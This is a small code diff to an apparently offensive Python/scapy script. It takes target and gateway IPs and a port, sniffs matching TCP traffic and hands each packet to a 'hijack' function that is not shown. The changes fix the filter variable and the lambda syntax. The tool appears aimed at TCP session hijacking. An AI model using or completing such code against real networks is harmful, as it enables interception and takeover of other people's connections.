@@ -49,11 +49,15 @@ try:
   # Checks if argument is not empty  
   if args.target_ip is not None and args.gateway_ip is not None and args.port is not None: 
     
+    setFilter = 'host ' + args.target_ip + ' and port ' + args.port
+    
     # Initiate the sniff
-    sniff(count=0, prn = lambda packet:hijack(packet), 
-          filter=filter, 
-          lfilter=lambda(f):f.haslayer(IP) and f.haslayer(TCP) and f.haslayer(Ether))
+    sniff(count=0, prn = lambda packet : hijack(packet), 
+          filter=setFilter, 
+          lfilter = lambda f : (f.haslayer(IP) and f.haslayer(TCP) and f.haslayer(Ether))
+          ) 
 
+    print("Good to go")
    
 except:
   print('[-]Please specify the appropriate options.')
